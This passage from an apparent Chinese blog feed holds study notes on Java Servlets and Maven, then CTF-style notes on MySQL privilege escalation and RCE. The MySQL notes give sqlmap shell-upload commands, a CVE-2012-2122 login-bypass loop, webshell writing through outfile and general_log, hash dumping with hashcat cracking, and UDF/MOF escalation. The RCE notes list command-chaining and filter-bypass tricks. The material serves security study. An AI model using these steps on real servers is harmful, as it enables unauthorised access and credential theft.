fa-sm"></i></a></p><ul><li><p>告诉服务器，我(当前请求)从哪里来？</p><p>作用：</p><ol><li><p>防止盗取链接</p></li><li><p>统计工作</p></li></ol></li></ul></li></ol></li></ul></li><li><p>请求空行<br>一个空行，就是用于分割POST请求的请求头，和请求体的。</p></li><li><p>请求体(正文)：</p><ul><li>封装POST请求消息的请求参数的 （放post参数的，get没有）</li></ul></li></ol><h4 id="字符串格式："><a href="#字符串格式：" class="headerlink" title="字符串格式："></a>字符串格式：</h4><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /login.htmlHTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/login.html</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">username=zhangsan</span><br></pre></td></tr></table></figure></div><blockquote><p><code>Connection: keep-alive</code>表示可以复用的连接</p></blockquote><h2 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h2><h3 id="request对象和response对象的原理"><a href="#request对象和response对象的原理" class="headerlink" title="request对象和response对象的原理"></a>request对象和response对象的原理</h3><ol><li>request和response对象是由服务器创建的。我们来使用它们</li><li>request对象是来获取请求消息，response对象是来设置响应消息</li></ol><h3 id="request对象继承体系结构"><a href="#request对象继承体系结构" class="headerlink" title="request对象继承体系结构"></a>request对象继承体系结构</h3><p>ServletRequest--接口<br>    |继承<br>HttpServletRequest-- 接口<br>    |实现<br>org.apache.catalina.connector.RequestFacade 类(tomcat)</p><h3 id="request功能"><a href="#request功能" class="headerlink" title="request功能"></a>request功能</h3><ol><li><p>获取请求消息数据</p><ol><li><p>获取请求行数据</p><ul><li><p>GET /day14/demo1?name=zhangsan HTTP/1.1</p></li><li><p>方法：</p><ol><li>获取请求方式 ：GET</li></ol><ul><li>String getMethod()</li></ul><ol start="2"><li>(*)获取虚拟目录：/day14</li></ol><ul><li>String getContextPath()</li></ul><ol start="3"><li>获取Servlet路径: /demo1</li></ol><ul><li>String getServletPath()</li></ul><ol start="4"><li>获取get方式请求参数：name=zhangsan (如果有多个用&连接)</li></ol><ul><li>String getQueryString()</li></ul><ol start="5"><li>(*)获取请求URI：/day14/demo1</li></ol><ul><li><p>String getRequestURI():/day14/demo1</p></li><li><p>StringBuffer getRequestURL()  :<a class="link"   href="http://localhost/day14/demo1" >http://localhost/day14/demo1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>URL:统一资源定位符 ： <a class="link"   href="http://localhost/day14/demo1" >http://localhost/day14/demo1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中华人民共和国</p></li><li><p>URI：统一资源标识符 : /day14/demo1共和国</p></li></ul><ol start="6"><li>获取协议及版本：HTTP/1.1</li></ol><ul><li>String getProtocol()</li></ul><ol start="7"><li>获取客户机的IP地址：</li></ol><ul><li>String getRemoteAddr()</li></ul></li></ul></li></ol></li><li><p>获取请求头数据<br>* 方法：</p><ul><li>(*)String getHeader(String name):通过请求头的名称获取请求头的值</li><li>Enumeration<String> getHeaderNames():获取所有的请求头名称</li></ul></li><li><p>获取请求体数据:</p></li></ol><ul><li><p>请求体：只有POST请求方式，才有请求体，在请求体中封装了POST请求的请求参数</p></li><li><p>步骤：</p><ol><li>获取流对象</li></ol><ul><li>BufferedReader getReader()：获取字符输入流，只能操作字符数据</li><li>ServletInputStream getInputStream()：获取字节输入流，可以操作所有类型数据<ul><li>在文件上传知识点后讲解</li></ul></li></ul><ol start="2"><li>再从流对象中拿数据</li></ol></li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取请求体</span></span><br><span class="line"><span class="comment">//获取字符流</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> request.getReader();</span><br><span class="line"><span class="comment">//读数据</span></span><br><span class="line">String line=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span>((line= br.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><p>作用：管理jar包、主动运行java</p><p>核心配置文件 pom.xml</p><h3 id="仓库分类"><a href="#仓库分类" class="headerlink" title="仓库分类"></a>仓库分类</h3><ul><li>本地</li><li>远程</li><li>中央（全球唯一）</li></ul><h3 id="目录结构-1"><a href="#目录结构-1" class="headerlink" title="目录结构"></a>目录结构</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6ly1h6q0o88p57j316o0ocacq.jpg"                      alt="image-20221001193432984"                ><figcaption>image-20221001193432984</figcaption></figure></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li>mvn compile<ul><li>编译产生target文件夹</li></ul></li><li>mvn clean <ul><li>清除target</li></ul></li><li>mvn package（若没编译会自动编译）<ul><li>打包成war包</li></ul></li><li>mvn install <ul><li>将项目安装到本地仓库</li></ul></li></ul><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q0x7k6b6j31ei0dgt9q.jpg"                      alt="image-20221001194313507"                ><figcaption>image-20221001194313507</figcaption></figure></p><blockquote><p>上面是三个生命周期，中间是最常用的</p></blockquote><h3 id="坐标"><a href="#坐标" class="headerlink" title="坐标"></a>坐标</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q16smnrlj30q207cq3n.jpg"                      alt="image-20221001195226310"                ><figcaption>image-20221001195226310</figcaption></figure></p><blockquote><p>groupld利用.分隔每层目录 </p><p>e.g. javax.servlet.jsp在仓库中是目录 javax/servlet/jsp</p><p>atifactld就是要导的包的文件夹了，先点进去里面一层一般是多个版本的文件夹</p><p>再在version里选择版本号</p><p>同理也可以导插件</p></blockquote><h3 id="骨架-模版"><a href="#骨架-模版" class="headerlink" title="骨架/模版"></a>骨架/模版</h3><p>archetype</p><p>webapp--web项目。quickstart--java项目</p><blockquote><p>自动创建webapp那一类模版</p></blockquote><p>不使用骨架直接创maven项目的话，java项目src/main下只有java和resources (test目录下只有java)</p><p>web项目src/main下有java和resources/webapp</p><blockquote><p>可以在test里面自己手动创建resources，然后右击选择</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6q1uanbk0j30z405idgn.jpg"                      alt="image-20221001201501803"                ><figcaption>image-20221001201501803</figcaption></figure></p></blockquote><h3 id="一些配置教训"><a href="#一些配置教训" class="headerlink" title="一些配置教训"></a>一些配置教训</h3><p>注意版本对应</p><p>如果是2021.3的idea，不要使用高版本maven，应使用3.5.4</p><h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><p>第一次引入会因为没有下载而爆红，点击刷新即可</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/006y8mN6gy1h6qv5pcwoaj30k80w6mxv.jpg"                      alt="image-20221002130921594"                ><figcaption>image-20221002130921594</figcaption></figure></p><h3 id="pom-xml增加plugin"><a href="#pom-xml增加plugin" class="headerlink" title="pom.xml增加plugin"></a>pom.xml增加plugin</h3><p>格式：(需要在project标签内)</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql提权</title>
      <link href="/2022/07/08/Mysql%E6%8F%90%E6%9D%83/"/>
      <url>/2022/07/08/Mysql%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ol><li><strong>具有MySQL的root权限，且MySQL以system权限运行。</strong></li><li><strong>具有执行SQL语句的权限。</strong></li></ol><p><strong>获取root密码的方法：</strong></p><ol><li><p>MySQL 3306 端口弱口令爆破</p></li><li><p>sqlmap 注入的 <code>--sql-shell</code> 模式</p><blockquote><p>使用条件:数据库开启了shell能执行命令</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u www.xxxx/aboutus.php?<span class="built_in">id</span>=1 --sql-shell</span><br></pre></td></tr></table></figure></div><p>进入了交互式页面，输入 select host,user,password from mysql.user这条命令，可以查询数据库的用户和密码</p></blockquote></li><li><p>网站的数据库配置文件中拿到明文密码信息</p></li><li><p>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</p><blockquote><p>Mysql 身份认证绕过漏洞（CVE-2012-2122）,当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说<u>只要知道用户名</u>，不断尝试就能够直接登入SQL数据库。官方说法是256次会成功一次</p><p>payload</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">seq</span> 1 1000`; <span class="keyword">do</span> mysql -uroot -pwrong -h your-ip -P3306 ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></div></blockquote></li></ol><h2 id="Webshell权限"><a href="#Webshell权限" class="headerlink" title="Webshell权限"></a>Webshell权限</h2><h3 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h3><h4 id="写shell条件"><a href="#写shell条件" class="headerlink" title="写shell条件"></a>写shell条件</h4><ul><li>知道网站物理路径</li><li>高权限数据库用户</li><li>load_file() 开启 即 secure_file_priv 无限制</li><li>网站路径有写入权限</li></ul><p>首先基础语法查询是否 secure_file_priv 没有限制</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure></div><blockquote><p>不同value值对应</p><table><thead><tr><th align="left">Value</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">NULL</td><td align="left">不允许导入或导出</td></tr><tr><td align="left">&#x2F;tmp</td><td align="left">只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td align="left">空</td><td align="left">不限制目录</td></tr></tbody></table><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以<u>向任意绝对路径写文件</u></p><p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p>若value为空，即不限制目录时，可以使用原生SQL语句来写shell</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure></div><p>sqlmap中做法</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure></div><h3 id="日志文件写shell"><a href="#日志文件写shell" class="headerlink" title="日志文件写shell"></a>日志文件写shell</h3><ul><li>Web 文件夹宽松权限可以写入</li><li>Windows 系统下</li><li>高权限运行 MySQL 或者 Apache</li></ul><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="built_in">log</span> |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure></div><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更改日志文件位置</span></span><br><span class="line"><span class="built_in">set</span> global general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> global general_log_file=<span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前配置</span></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| Variable_name    | Value                       |</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| general_log      | ON                          |</span><br><span class="line">| general_log_file | /var/www/html/info.php |</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 往日志里面写入 payload</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时已经写到 info.php 文件当中了</span></span><br><span class="line">root@c1595d3a029a:/var/www/html/$ <span class="built_in">cat</span> info.php </span><br><span class="line">/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:</span><br><span class="line">Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock</span><br><span class="line">Time                 Id Command    Argument</span><br><span class="line">201031 21:14:46       40 Query    SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span></span><br><span class="line">201031 21:15:34       40 Query    <span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure></div><p>这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php</span><br></pre></td></tr></table></figure></div><p>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。</p><h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MySQL &lt;= 5.6 版本</span></span><br><span class="line">mysql&gt; <span class="keyword">select</span> host, user, password from mysql.user;</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL &gt;= 5.7 版本</span></span><br><span class="line">mysql&gt; <span class="keyword">select</span> host,user,authentication_string from mysql.user;</span><br></pre></td></tr></table></figure></div><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>在线网站来解密，如国内的 CMD5</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h21dwwaf21j214808y3ze.jpg"                      alt="img"                ><figcaption>img</figcaption></figure></p><p>也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 300 --force <span class="string">&#x27;8232A1298A49F710DBEE0B330C42EEC825D4190A&#x27;</span> password.txt -O</span><br></pre></td></tr></table></figure></div><p><strong>-a 破解模式</strong></p><p>指定要使用的破解模式，其值参考后面对参数</p><div class="highlight-container" data-rel="R"><figure class="iseeu highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span> <span class="punctuation">[</span> Attack Modes <span class="punctuation">]</span> <span class="operator">-</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | Mode</span></span><br><span class="line"> <span class="operator">==</span><span class="operator">=</span><span class="operator">+</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">|</span> Straight                <span class="comment"># 直接字典破解</span></span><br><span class="line">  <span class="number">1</span> <span class="operator">|</span> Combination             <span class="comment"># 组合破解</span></span><br><span class="line">  <span class="number">3</span> <span class="operator">|</span> Brute<span class="operator">-</span>force             <span class="comment"># 掩码暴力破解</span></span><br><span class="line">  <span class="number">6</span> <span class="operator">|</span> Hybrid Wordlist <span class="operator">+</span> Mask  <span class="comment"># 字典+掩码破解</span></span><br><span class="line">  <span class="number">7</span> <span class="operator">|</span> Hybrid Mask <span class="operator">+</span> Wordlist  <span class="comment"># 掩码+字典破解</span></span><br></pre></td></tr></table></figure></div><p><strong>-m 破解hash类型</strong></p><p>指定要破解的hash类型，后面跟hash类型对应的数字，具体类型详见下表：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">12   | PostgreSQL                                       | Database Server</span><br><span class="line">131  | MSSQL (2000)                                     | Database Server</span><br><span class="line">132  | MSSQL (2005)                                     | Database Server</span><br><span class="line">1731 | MSSQL (2012, 2014)                               | Database Server</span><br><span class="line">200  | MySQL323                                         | Database Server</span><br><span class="line">300  | MySQL4.1/MySQL5                                  | Database Server</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p><strong>–force</strong></p><p>忽略破解过程中的警告信息</p><p><strong>-O</strong></p><p><code>--optimized-kernel-enable</code> 启用优化的内核（限制密码长度</p><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>用户通过自定义函数，使得在SQL语句中调用新函数</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> version();   # 获取数据库版本</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();  # 获取数据库用户</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@basedir</span>;   # 获取数据库安装目录</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> ‘<span class="operator">%</span>plugin<span class="operator">%</span>’; # 查看plugin路径。</span><br></pre></td></tr></table></figure></div><h3 id="动态链接库写入函数"><a href="#动态链接库写入函数" class="headerlink" title="动态链接库写入函数"></a>动态链接库写入函数</h3><ul><li><strong>sqlmap 的 UDF 动态链接库文件位置</strong>(sqlmap的动态链接库需要使用自带解码工具cloak.py解码)</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap根目录/data/udf/mysql</span><br></pre></td></tr></table></figure></div><ul><li><strong>Metasploit 的 UDF 动态链接库文件位置</strong></li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSF 根目录/embedded/framework/data/exploits/mysql</span><br></pre></td></tr></table></figure></div><p>寻找插件目录</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">&#x27;%plugin%&#x27;</span>;</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| Variable_name | Value                        |</span><br><span class="line">+---------------+------------------------------+</span><br><span class="line">| plugin_dir    | /usr/local/mysql/lib/plugin/ |</span><br><span class="line">+---------------+------------------------------+</span><br></pre></td></tr></table></figure></div><p>写入动态数据库</p><p>坑，待补</p><h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE总结</title>
      <link href="/2022/07/03/RCE%E6%80%BB%E7%BB%93/"/>
      <url>/2022/07/03/RCE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE总结"><a href="#RCE总结" class="headerlink" title="RCE总结"></a>RCE总结</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>RCE，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>system()函数会调用fork()产生子进程，由子进程调用<code>/bin/sh -c command</code>执行特定的命令，暂停当前进程直到command命令执行完毕，当此命令执行完后随即返回原调用的进程。</p><p>当system()正常执行，将返回命令的退出码；</p><p>当返回值为127，相当于执行了exit函数，而自身命令没有执行；</p><p>当返回值为-1，代表没有执行system调用。</p><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>system()的不同主要在于exec()并不会调用fork()产生新进程、暂停原命令来执行新命令，而是直接覆盖原命令，对返回值有影响。</p><p>exec执行command命令时，不会输出全部结果，而是返回结果的最后一行</p><blockquote><p>结果有多行时(如列目录时)要传入第二个参数接收，要求是数组</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;ls&#x27;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a><strong>shell_exec()</strong></h3><p>在shell下执行，适用于Linux Macos，并且结果可以有多行，字符串方式返回，绕过执行过程中出错或无输出，返回NULL</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h3><p>passthru直接将结果输出，<u>不返回结果</u>(与system的区别)</p><h2 id="系统命令拼接方式"><a href="#系统命令拼接方式" class="headerlink" title="系统命令拼接方式"></a>系统命令拼接方式</h2><ul><li>“|”:管道符，前面命令标准输出，后面命令的标准输入。例如：help | more </li><li>“&amp;” commandA &amp; commandB 先运行命令A，然后运行命令B </li><li>“||” commandA || commandB 运行命令A，如果失败则运行命令B </li><li>“&amp;&amp;” commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</li><li>cmd1 ; cmd2 (; 分号操作符)执行多条命令</li></ul><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="php字符被过滤"><a href="#php字符被过滤" class="headerlink" title="php字符被过滤"></a>php字符被过滤</h3><p>使用短标签 <code>&lt;?= php代码 ?&gt; </code></p><h3 id="system被过滤"><a href="#system被过滤" class="headerlink" title="system被过滤"></a>system被过滤</h3><p>使用反引号绕过</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">echo</span> `ls /`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" 